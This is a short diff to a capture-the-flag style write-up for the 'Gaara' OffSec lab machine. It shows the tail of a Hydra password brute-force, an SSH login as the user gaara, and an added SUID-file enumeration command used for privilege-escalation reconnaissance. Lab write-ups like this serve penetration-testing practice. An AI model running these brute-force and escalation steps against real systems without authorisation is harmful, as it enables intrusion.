@@ -204,6 +204,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-04 02:59:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-04 03:01:45
 ```
 
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/df4e3aef-9b4c-482c-96c1-453128b32884)
+
 SSH as gaara
 ```
 > ssh gaara@192.168.166.142
@@ -224,4 +226,9 @@ permitted by applicable law.
 gaara@Gaara:~$ whoami && id
 gaara
 uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
+```
+
+
+```
+gaara@Gaara:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
 ```
